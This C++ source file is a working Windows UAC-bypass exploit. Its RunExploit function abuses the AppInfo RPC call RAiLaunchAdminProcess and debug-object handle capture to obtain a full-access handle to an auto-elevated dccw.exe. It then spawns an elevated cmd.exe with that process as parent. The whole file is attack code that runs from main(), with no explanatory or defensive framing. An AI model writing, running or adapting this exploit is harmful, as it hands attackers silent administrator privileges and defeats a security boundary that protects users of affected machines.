#pragma once

#include "stdafx.h"
#include "rpc_h.h"
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib, "rpcrt4.lib")
using namespace std;

typedef NTSTATUS(NTAPI* TNtQueryInformationProcess)(
	IN HANDLE           ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID           ProcessInformation,
	IN ULONG            ProcessInformationLength,
	OUT PULONG          ReturnLength
	);

typedef NTSTATUS(NTAPI* NtDuplicateObject)(IN HANDLE, IN HANDLE, IN HANDLE, OUT PHANDLE, IN ACCESS_MASK, IN ULONG, IN ULONG);

//const DWORD ProcessDebugObjectHandle = 0x1e;

const int ProcessDebugObjectHandle = 0x1e;


RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"201ef99a-7fa0-444c-9399-19ba84f12a1a", L"ncalrpc", 
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}


void RunExploit()
{
	NTSTATUS ntstatus;
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	DEBUG_EVENT dbgEvent;
	HANDLE dbgHandle = NULL;
	HANDLE dbgProcessHandle = NULL;
	HANDLE dupHandle = NULL;

	struct Struct_14_t StructMember10 = {0,0};
	struct Struct_22_t StructMember0 = {L"StructMember0", 0, 0, 0, 0, 0, 0, 0, 0, 0, StructMember10};
	struct Struct_56_t Struct_56;
	long arg_12;

	PROCESS_INFORMATION procinfo;
	procinfo.hProcess = NULL;
	procinfo.hThread = NULL;
	procinfo.dwProcessId = 0;
	procinfo.dwThreadId = 0;

	//spawn non elevated process
	Proc0_RAiLaunchAdminProcess(handle, L"C:\\Windows\\System32\\notepad.exe", NULL , 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, L"C:\\", L"WinSta0\\Default", &StructMember0, 0, 0xffffffff, &Struct_56,&arg_12);

	procinfo.hProcess = (HANDLE)Struct_56.StructMember0;
	procinfo.hThread = (HANDLE)Struct_56.StructMember1;
	procinfo.dwProcessId = (DWORD)Struct_56.StructMember2;
	procinfo.dwThreadId = (DWORD)Struct_56.StructMember3;
	printf("Non elevated process %p:\n", procinfo.hProcess);

	// Capture debug object handle.
	HANDLE hProcessDebugObject = 0;
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (hNtdll)
	{
		auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
		ntstatus = pfnNtQueryInformationProcess(procinfo.hProcess, (PROCESSINFOCLASS)ProcessDebugObjectHandle, &hProcessDebugObject, sizeof HANDLE, NULL);
	}
	if (hProcessDebugObject != 0)
	{
		printf("Debug obj obtained: %p\n", hProcessDebugObject);
	}
	
	// Detach debug and kill non elevated victim process.
	((void(NTAPI*)(HANDLE, HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "NtRemoveProcessDebug"))(procinfo.hProcess, hProcessDebugObject);
	TerminateProcess(procinfo.hProcess, 0);
	CloseHandle(procinfo.hThread);
	CloseHandle(procinfo.hProcess);

	RtlSecureZeroMemory(&procinfo, sizeof(procinfo));
	RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
	RtlSecureZeroMemory(&Struct_56, sizeof(Struct_56));

	//spawn elevated process
	Proc0_RAiLaunchAdminProcess(handle, L"C:\\Windows\\System32\\dccw.exe", NULL, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, L"C:\\", L"WinSta0\\Default", &StructMember0, 0, 0xffffffff, &Struct_56, &arg_12);
	procinfo.hProcess = (HANDLE)Struct_56.StructMember0;
	procinfo.hThread = (HANDLE)Struct_56.StructMember1;
	procinfo.dwProcessId = (DWORD)Struct_56.StructMember2;
	procinfo.dwThreadId = (DWORD)Struct_56.StructMember3;
	printf("elevated process %p:\n", procinfo.hProcess);

	// Update thread TEB with debug object handle to receive debug events.
	((void(NTAPI*)(HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "DbgUiSetThreadDebugObject"))(dbgHandle);
	dbgProcessHandle = NULL;
	
	// Debugger wait cycle
	while (1) {

		if (!WaitForDebugEvent(&dbgEvent, INFINITE))  break;

		switch (dbgEvent.dwDebugEventCode) {
		case CREATE_PROCESS_DEBUG_EVENT:
			dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
			break;
		}

		if (dbgProcessHandle) break;
		ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
	}

	// Create new handle from captured with PROCESS_ALL_ACCESS.
	dupHandle = NULL;
	if (hNtdll)
	{
		auto pNtDuplicateObject = (NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
		ntstatus = pNtDuplicateObject(dbgProcessHandle, GetCurrentProcess(), GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, 0, 0);
	}

	// Create process from duplicated handle
	SIZE_T size = 0x30;
	STARTUPINFOEX si{ 0 };
	PROCESS_INFORMATION pi{ 0 };
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
	*(PVOID*)(&si.lpAttributeList) = malloc(size);
	if (si.lpAttributeList) 
	{
		if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) 
		{
			if (UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &dupHandle, sizeof(HANDLE), 0, 0))
			{
				si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
				si.StartupInfo.wShowWindow = SW_SHOW;
				CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, 0, 0, 0, CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT, 0, "C:\\Windows\\System32", (LPSTARTUPINFOA)&si, &pi);
			}
		}
	}

}

int main()
{
	RunExploit();
	
	return 0;
}

